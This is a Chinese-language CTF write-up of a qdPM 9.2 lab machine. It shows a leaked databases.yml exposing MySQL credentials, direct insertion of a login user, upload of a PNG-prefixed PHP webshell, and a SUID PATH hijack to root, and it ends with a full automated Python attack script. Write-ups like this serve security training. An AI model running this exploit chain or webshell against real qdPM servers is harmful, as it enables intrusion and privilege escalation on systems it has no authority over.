---
title: 'ICA 秘密项目 — qdPM 多层渗透'
date: '2026-05-28'
modifiedTime: '2026-05-28'
intro: '信息泄露 + 数据库注入 + 文件上传绕过 + SUID PATH 劫持。从 qdPM 9.2 的 `databases.yml` 泄露入手，通过 MySQL 注入用户登录后台，上传 webshell 拿 www-data 权限，最终利用 '
tags: ['ctf', 'writeup', 'sql注入', 'rce', '文件上传', '提权', 'php', 'python', '命令注入']
cover: ''
---

# ICA 秘密项目 — qdPM 多层渗透

## Summary

信息泄露 + 数据库注入 + 文件上传绕过 + SUID PATH 劫持。从 qdPM 9.2 的 `databases.yml` 泄露入手，通过 MySQL 注入用户登录后台，上传 webshell 拿 www-data 权限，最终利用 `/opt/get_access` 的 PATH 劫持提权至 root，获取双 Flag。

## 侦查

三个目标端口：

| 地址 | 端口 | 服务 |
|------|------|------|
| `pw2tppp` / `qfb5dzx` | 40453 / 44324 | OpenSSH 8.4p1 |
| `tgw9k30` / `o39729h` | 41110 / 45787 | Apache 2.4.48 + qdPM 9.2 |
| `xak2a9i` / `4um6a59` | 43775 / 41380 | MySQL 8.0.26 |

## Solution

### Step 1: 信息泄露 — databases.yml

qdPM 9.2 的配置文件可未授权访问，直接暴露数据库凭据：

```bash
curl http://target:45787/core/config/databases.yml
```

```yaml
all:
  doctrine:
    class: sfDoctrineDatabase
    param:
      dsn: 'mysql:dbname=qdpm;host=localhost'
      username: qdpmadmin
      password: "<?php echo urlencode('UcVQCMQk2STVeS6J') ; ?>"
```

### Step 2: 数据库注入用户

qdPM 的 `users` 表为空，直接用 MySQL 写入一个已知密码的用户。通过 passlib 生成 phpass 格式哈希：

```python
from passlib.hash import phpass
# 生成密码 'agent47' 的 phpass 哈希
hash_val = phpass.hash('agent47')  # $P$HUFPRPj.1OkdaRzdhU4hT/8IoNzIo31

# 注入用户
INSERT INTO users (id, users_group_id, name, email, password, active)
VALUES (1, 1, 'Agent47', 'agent47@ica.gov', hash_val, 1);
```

### Step 3: 文件上传绕过 → Webshell

以 `agent47@ica.gov / agent47` 登录 qdPM。`/myAccount` 页面允许上传头像，虽然存在 GD 库图片处理报错，但文件仍被保存到 `uploads/users/`（目录列表开启）。

使用有效 PNG 头 + PHP payload 绕过：

```python
# 创建 1x1 真 PNG + PHP 代码
payload = valid_png_bytes + b'\n<?php if(isset($_REQUEST["cmd"])){ echo system($_REQUEST["cmd"]); die(); } ?>\n'

# 上传
requests.post('/index.php/myAccount/update', files={
    'users[photo]': ('shell.php', payload, 'image/png'),
    ...
})
```

文件被保存为 `uploads/users/app_user_TIMESTAMP.php`，Apache 直接解析执行 PHP。

### Step 4: Flag 1 — /tmp/flag.txt

```bash
curl "http://target/uploads/users/app_user_1779980873.php?cmd=cat%20/tmp/flag.txt"
```

```
flag{0f7151e3-fc2c-44e6-9c66-f704b7009c15}
```

### Step 5: SUID PATH 劫持提权

SUID 文件 `/opt/get_access` 调用 `system("cat /root/system.info")`，未使用绝对路径：

```bash
$ strings /opt/get_access | grep "cat "
cat /root/system.info
```

创建恶意 `cat` 脚本并劫持 PATH：

```bash
printf '%s\n' '#!/bin/bash' '/bin/cat /root/flag.txt > /tmp/rootflag' > /tmp/cat
chmod +x /tmp/cat
PATH=/tmp:$PATH timeout 3 /opt/get_access
```

⚠️ 关键点：脚本内必须使用 `/bin/cat` 绝对路径，否则 PATH 劫持导致递归调用自身。

### Flag 2 — /root/flag.txt

```
flag{9473de2a-438f-4ac7-8f44-237930dc7c85}
```

## 完整攻击脚本

```python
import requests, pymysql, struct, zlib
from lxml import html

HTTP = 'http://TARGET_HTTP:PORT'
MYSQL_HOST = 'TARGET_MYSQL'
MYSQL_PORT = PORT
EMAIL = 'agent47@ica.gov'
PASS = 'agent47'

# 1. 注入用户
conn = pymysql.connect(host=MYSQL_HOST, port=MYSQL_PORT,
    user='qdpmadmin', password='UcVQCMQk2STVeS6J', database='qdpm')
cur = conn.cursor()
cur.execute("INSERT INTO users (id, users_group_id, name, email, password, active) "
    "VALUES (1, 1, 'Agent47', %s, '$P$HUFPRPj.1OkdaRzdhU4hT/8IoNzIo31', 1)", (EMAIL,))
conn.commit(); conn.close()

# 2. 登录 + 上传 webshell
session = requests.session()
session.post(f'{HTTP}/index.php/login', data={'login[email]': EMAIL, 'login[password]': PASS})

# 创建 PNG+PHP payload
def make_png_php():
    ihdr = struct.pack('>IIBBBBB', 1,1,8,2,0,0,0)
    ihdr_crc = zlib.crc32(b'IHDR'+ihdr) & 0xffffffff
    idat_crc = zlib.crc32(b'IDAT'+zlib.compress(b'\x00\xff\x00\x00')) & 0xffffffff
    iend_crc = zlib.crc32(b'IEND') & 0xffffffff
    return (b'\x89PNG\r\n\x1a\n' +
        struct.pack('>I',13)+b'IHDR'+ihdr+struct.pack('>I',ihdr_crc) +
        struct.pack('>I',10)+b'IDAT'+zlib.compress(b'\x00\xff\x00\x00')+struct.pack('>I',idat_crc) +
        struct.pack('>I',0)+b'IEND'+struct.pack('>I',iend_crc) +
        b'\n<?php if(isset($_REQUEST["cmd"])){ echo system($_REQUEST["cmd"]); die(); } ?>\n')

session.post(f'{HTTP}/index.php/myAccount/update', files={
    'sf_method': (None, 'put'), 'users[id]': (None, '1'),
    'users[name]': (None, 'Agent47'), 'users[email]': (None, EMAIL),
    'users[photo]': ('shell.php', make_png_php(), 'image/png'),
})

# 3. 获取 webshell 路径
r = session.get(f'{HTTP}/uploads/users/')
import re; ws_file = re.findall(r'href="([^"]+\.php)"', r.text)[0]
WS = f'{HTTP}/uploads/users/{ws_file}'

# 4. Flag 1
print(requests.get(WS, params={'cmd': 'cat /tmp/flag.txt'}).text)

# 5. 提权 → Flag 2
requests.get(WS, params={'cmd': 'printf "%s\\n" "#!/bin/bash" "/bin/cat /root/flag.txt > /tmp/rootflag" > /tmp/cat && chmod +x /tmp/cat'})
requests.get(WS, params={'cmd': 'PATH=/tmp:$PATH timeout 3 /opt/get_access 2>/dev/null'})
print(requests.get(WS, params={'cmd': 'cat /tmp/rootflag'}).text)
```

## Flag

```
Flag 1: flag{0f7151e3-fc2c-44e6-9c66-f704b7009c15}
Flag 2: flag{9473de2a-438f-4ac7-8f44-237930dc7c85}
```

## 关键技术点

- **qdPM 9.2 信息泄露**: `/core/config/databases.yml` 未限制访问
- **文件上传绕过**: 有效 PNG 头 + PHP 尾部，GD 报错但文件仍被保存
- **Apache 目录列表**: `uploads/users/` 开启 Indexes，无需猜测文件名
- **SUID PATH 劫持**: `system()` 调用无绝对路径的命令，利用 `$PATH` 优先级注入恶意脚本
- **递归陷阱**: PATH 劫持时脚本内必须用绝对路径调用原命令
